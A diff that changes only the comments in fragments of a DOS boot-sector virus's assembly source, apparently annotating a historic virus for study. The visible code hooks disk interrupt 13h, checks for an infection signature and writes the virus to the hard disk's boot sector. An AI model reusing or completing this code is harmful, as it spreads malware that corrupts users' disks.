@@ -27,7 +27,7 @@ int_13_handler:
               jnz return_to_int_13
               xor ax,ax
               mov ds,ax
-              test byte [0x43f],0x1          ; bios: drive running
+              test byte [0x43f],0x1          ; bios: diskette motor status
               jnz return_to_int_13           ; floppy drive motors active? return.
               pop ax
               pop ds
@@ -179,7 +179,7 @@ entry_point_from_resident_address:
               push cs
               pop ds
               mov ax,0x201                          ; read, one sector
-              mov bx,virus_start                         ; buffer
+              mov bx,virus_start                    ; buffer at resident virus location (offset 0)
               mov cx,[v_current_storage]
               cmp cx,k_stored_on_hard_disk
               jnz from_floppy
@@ -213,10 +213,10 @@ check_if_infected:
               xor si,si
               cld
               lodsw
-              cmp ax,[bx]                  ; compares the first 4 bytes (long jump, and 0F5h)
+              cmp ax,[bx]                  ; compare first 2 bytes of virus signature with boot sector
               jnz infect_hard_disk
               lodsw
-              cmp ax,[bx+0x2]
+              cmp ax,[bx+0x2]              ; compare next 2 bytes (total 4-byte signature check)
               jnz infect_hard_disk
 
 check_current_date:
@@ -247,7 +247,7 @@ infect_hard_disk:
 
               mov ax,0x301                  ; write, one sector
               xor bx,bx
-              inc cl                        ; second sector of hard disk
+              inc cl                        ; sector 1 (MBR) - CX=0 after REP MOVSW, INC CL→1
               int 0x13
               jmp short check_current_date
 
